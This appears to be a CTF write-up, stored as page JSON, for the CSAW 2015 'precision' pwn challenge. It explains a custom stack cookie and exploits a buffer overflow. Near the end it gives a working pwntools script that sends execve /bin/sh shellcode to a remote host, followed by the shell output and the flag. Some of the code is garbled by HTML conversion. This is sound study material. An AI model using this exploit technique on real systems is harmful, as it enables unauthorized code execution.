{"pageContext":{"html":"<p><a href=\"ctf=csaw-quals-2015\"></a>\n<a href=\"type=pwn\"></a>\n<a href=\"tags=stack-cookie,buffer-overflow\"></a></p>\n<p>We are given a <a href=\"/precision_a8f6f0590c177948fe06c76a1831e650-a8f6f0590c177948fe06c76a1831e650.\">file</a></p>\n<p><code>bash $ file precision_a8f6f0590c177948fe06c76a1831e650 precision_a8f6f0590c177948fe06c76a1831e650: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=929fc6f283d6f6c3c039ee19bc846e927103ebcd, not stripped</code>\nLets disass main\n<code>objdump 0x0804851d &#x3C;+0>: push ebp 0x0804851e &#x3C;+1>: mov ebp,esp 0x08048520 &#x3C;+3>: and esp,0xfffffff0 0x08048523 &#x3C;+6>: sub esp,0xa0 0x08048529 &#x3C;+12>: fld QWORD PTR ds:0x8048690 0x0804852f &#x3C;+18>: fstp QWORD PTR [esp+0x98] 0x08048536 &#x3C;+25>: mov eax,ds:0x804a040 0x0804853b &#x3C;+30>: mov DWORD PTR [esp+0xc],0x0 0x08048543 &#x3C;+38>: mov DWORD PTR [esp+0x8],0x2 0x0804854b &#x3C;+46>: mov DWORD PTR [esp+0x4],0x0 0x08048553 &#x3C;+54>: mov DWORD PTR [esp],eax 0x08048556 &#x3C;+57>: call 0x8048400 &#x3C;setvbuf@plt> 0x0804855b &#x3C;+62>: lea eax,[esp+0x18] 0x0804855f &#x3C;+66>: mov DWORD PTR [esp+0x4],eax 0x08048563 &#x3C;+70>: mov DWORD PTR [esp],0x8048678 0x0804856a &#x3C;+77>: call 0x80483b0 &#x3C;printf@plt> 0x0804856f &#x3C;+82>: lea eax,[esp+0x18] 0x08048573 &#x3C;+86>: mov DWORD PTR [esp+0x4],eax 0x08048577 &#x3C;+90>: mov DWORD PTR [esp],0x8048682 0x0804857e &#x3C;+97>: call 0x8048410 &#x3C;__isoc99_scanf@plt> 0x08048583 &#x3C;+102>: fld QWORD PTR [esp+0x98] 0x0804858a &#x3C;+109>: fld QWORD PTR ds:0x8048690 0x08048590 &#x3C;+115>: fucomip st,st(1) 0x08048592 &#x3C;+117>: fstp st(0) 0x08048594 &#x3C;+119>: jp 0x80485a9 &#x3C;main+140> 0x08048596 &#x3C;+121>: fld QWORD PTR [esp+0x98] 0x0804859d &#x3C;+128>: fld QWORD PTR ds:0x8048690 0x080485a3 &#x3C;+134>: fucomip st,st(1) 0x080485a5 &#x3C;+136>: fstp st(0) 0x080485a7 &#x3C;+138>: je 0x80485c1 &#x3C;main+164> 0x080485a9 &#x3C;+140>: mov DWORD PTR [esp],0x8048685 0x080485b0 &#x3C;+147>: call 0x80483c0 &#x3C;puts@plt> 0x080485b5 &#x3C;+152>: mov DWORD PTR [esp],0x1 0x080485bc &#x3C;+159>: call 0x80483e0 &#x3C;exit@plt> 0x080485c1 &#x3C;+164>: mov eax,ds:0x804a030 0x080485c6 &#x3C;+169>: lea edx,[esp+0x18] 0x080485ca &#x3C;+173>: mov DWORD PTR [esp+0x4],edx 0x080485ce &#x3C;+177>: mov DWORD PTR [esp],eax 0x080485d1 &#x3C;+180>: call 0x80483b0 &#x3C;printf@plt> 0x080485d6 &#x3C;+185>: leave 0x080485d7 &#x3C;+186>: ret</code>\nWe see some fancy fld,fstp,fucomip etc. What is happening here is, the program is setting a cookie on the stack by itself before input and then verifies it with the same value after input. If value doesn't change it rets else it exits.\n<code>bash $ ./precision_a8f6f0590c177948fe06c76a1831e650 Buff: 0xff947f78 AAAA Got AAAA</code>\nThe address here is the start of the input. Solves our problem of locating the input.\n<code>bash gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : disabled PIE : disabled RELRO : Partial</code>\nNX is disabled. This calls for a shellcode on the stack.\nPayload format</p>\n<blockquote>\n<p>NOPs+shellcode+pad+cookie+pad+ret</p>\n</blockquote>\n<p>Use pattern<em>create and pattern</em>offset to figure out the total length. Maintain the cookie value at proper offset and bang!</p>\n<p>`<code></code>python\nfrom pwn import *</p>\n<h1>s=process(\"./precision\")</h1>\n<p>s=remote('54.173.98.115',1259)\na=s.recvline()\naddr=p32(int(a.split()[1],16))\nprint a\npayload=\"\\x90'<em>(128-36)+'\\x83\\xec\\x7f\\x31\\xc0\\x50\\x68\\x2f\\x2f\"\npayload+=\"\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\"\npayload+='\\x89\\xe1\\x04\\x05\\x04\\x06\\xcd\\x80\\xb0\\x01\\x31\\xdb\\xcd\\x80'\npayload+='\\x47\\x5a\\x31\\xa5'[::-1]+'\\x40\\x50\\x15\\x55'[::-1]+'A'</em>(12)\ns.send(payload+addr)\ns.interactive()\n<code>gives us shell</code>bash\n$ id\nuid=1001(ctf) gid=1001(ctf) groups=1001(ctf)\n$ cat flag\nflag{1<em>533</em>y0u<em>kn0w</em>y0ur<em>w4y</em>4r0und<em>4</em>buff3r}\n`<code></code></p>\n<p>Flag</p>\n<blockquote>\n<p>flag{1<em>533</em>y0u<em>kn0w</em>y0ur<em>w4y</em>4r0und<em>4</em>buff3r}</p>\n</blockquote>","relativePath":"writeups/csaw-quals-2015/pwn/precision/sudhackar"}}